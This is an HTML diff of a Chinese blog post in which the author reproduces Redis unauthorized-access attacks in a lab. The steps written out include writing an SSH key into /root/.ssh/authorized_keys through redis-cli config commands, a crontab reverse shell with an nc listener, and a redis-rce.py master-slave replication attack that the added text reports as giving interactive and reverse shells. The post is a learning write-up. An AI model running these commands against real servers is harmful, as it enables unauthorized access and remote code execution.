@@ -156,10 +156,17 @@
 <p>漏洞利用前提：redis-cli可以正常连上，未验证登录且有web服务、知晓路径，有写文件权限</p>
 <p><strong>二</strong>：<strong>SSH密钥连接</strong>。(由于找不到.ssh目录，没有复现成功)</p>
 <p>基本思路：用git生成公钥和私钥(ssh-keygen -t rsa)，把公钥传到靶机上的.ssh文件夹(专门存放密钥的文件)下，再通过本地ssh连接			   																																							    将公钥写入redis：type key.txt | redis-cli.exe -h 172.20.10.7 -x set abc    	      																      连接redis，更改redis路径为ssh公钥存放目录(&#x2F;root&#x2F;.ssh)：config dir &#x2F;root&#x2F;.ssh		                                                           生成缓冲文件：config set dbfilename authorized_keys  (名字必须是authorized_keys，由配置文件决定)                                    ssh连接：ssh -i id_rsa 172.20.10.7   (id_rsa为生成的私钥)	</p>
+<p>后来又试了一下，能连上，但是需要输入密码xwx</p>
+<p> <img src="/../images/redisssh.png"></p>
 <p>三：<strong>利用crontab反弹shell</strong>(我的linux虚拟机都是Debian，没法反弹成功)</p>
 <p>crontab：是一个在Linux和类Unix操作系统上用于安排定期运行任务的命令。crontab 文件包括一系列任务，每条任务占据一行，每行任务都由六个时间字段和一个命令字段组成。		<img src="/../images/redis-pic/image-20230607210212564.png">	        		   运行命令后，可以在相应目录查看到相应的反弹语句。同时攻击机监听8877端口(nc -lvvp 8877)。</p>
 <p>四：Redis主从复制反弹shell</p>
-<p>主从复制：简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。					                    反弹shell原理：在 Redis 主服务器上运行一个 SHELL 命令，该命令会利用 Redis 主从复制机制将 SHELL 命令传播到 Redis 从服务器。从服务器会执行该命令并向攻击者反弹 Shell。                               												        利用redis-rce反弹shell：python redis-rce.py -r 172.20.10.7 -L 172.20.10.2 -f module.so 	-r是目标ip，-L是攻击者ip           我运行的时候会报： unknown command ‘system.exec’ , check your module!这个错。查了一下，应该是系统的问题。后来换了5.0.9的版本，在启动redis服务时需要加上 redis-server –protected-mode no攻击机才能连上。然后再运行脚本:ERR unknown command `system.exec`, with args beginning with: `ls`(乐)。								 </p>
+<p>主从复制：简单理解为有两台redis服务器,一个是主，一个是从，两台服务器的数据是一样的，主服务器负责写入数据，从服务器负责读取数据。一般一个主服务器有好几个从服务器，且从服务器可能也是其他redis服务器的主服务器。这样的好处就是如果主服务器或者一个从服务器崩溃不会影响数据完整性，且读写分开，减轻服务器压力。牺牲空间，换区效率。																																	            					                    反弹shell原理：在 Redis 主服务器上运行一个 SHELL 命令，该命令会利用 Redis 主从复制机制将 SHELL 命令传播到 Redis 从服务器。从服务器会执行该命令并向攻击者反弹 Shell。                               												        利用redis-rce反弹shell：python redis-rce.py -r 172.20.10.7 -L 172.20.10.2 -f module.so 	-r是目标ip，-L是攻击者ip           我运行的时候会报： unknown command ‘system.exec’ , check your module!这个错。查了一下，应该是系统的问题。后来换了5.0.9的版本，在启动redis服务时需要加上 redis-server –protected-mode no攻击机才能连上。然后再运行脚本:ERR unknown command `system.exec`, with args beginning with: `ls`(乐)。								 </p>
+<p>ok。。。换了个centos7系统作为靶机。需要关闭centos防火墙，且开启redis服务需要用到以下命令：redis-server –protected-mode no  成功执行了连上，并且可以命令执行。			<img src="/../images/redisrce.png"></p>
+<p> <img src="/../images/redis_r1.png"></p>
+<p> <img src="/../images/redis_r2.png"></p>
+<p>可以看到两种模式，一种是交互式shell一种是反弹shell。两种模式有点小区别。交互式只能在当前目录下操作，在执行cd命令的时候会失败。反弹shell模式则没有问题。</p>
+<p>接下来分析一下原理：可以看到在当前目录下有一个module.so文件。先来了解一下.so文件是用来干嘛的：.so文件时linux系统的共享对象文件。.so文件通常包含可执行代码以及在程序运行时所需的库和其他资源，以便不同的程序可以共享相同的库和模块。这里相当于上传了一个module.so文件，可以实现命令执行。查看.so文件的话，需要进行反编译。</p>
 
             </div>
 
